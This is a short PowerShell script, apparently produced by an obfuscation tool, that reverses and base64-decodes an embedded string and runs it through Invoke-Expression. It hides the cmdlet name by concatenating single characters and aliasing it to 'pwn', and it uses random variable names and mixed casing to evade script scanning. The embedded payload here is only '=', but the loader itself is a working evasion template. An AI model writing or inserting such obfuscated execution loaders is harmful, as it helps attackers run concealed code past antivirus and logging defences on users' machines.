$JsrCLyzu1Obn0aUYv9 = "=" ;
$AuAQN08GZ = $JsrCLyzu1Obn0aUYv9.ToCharArray() ; [array]::Reverse($AuAQN08GZ) ; -join $AuAQN08GZ 2>&1> $null ;
$LoadcODeHoLprpv42y = [sYstEM.tExt.eNCodInG]::uTF8.GetstriNG([SySteM.cONvErt]::FROmbaSe64striNg("$AuAQN08GZ")) ;
$lqI4iTKSnWQdyuNcDzkxPOfte = "i"+"N"+"v"+"o"+"k"+"e"+"-"+"E"+"X"+"P"+"r"+"E"+"s"+"S"+"I"+"o"+"n" ; nEw-AlIAs -NAme pWn -VaLue $lqI4iTKSnWQdyuNcDzkxPOfte -fOrCe ; pwN $loAdcOdeHoLprpv42y ;
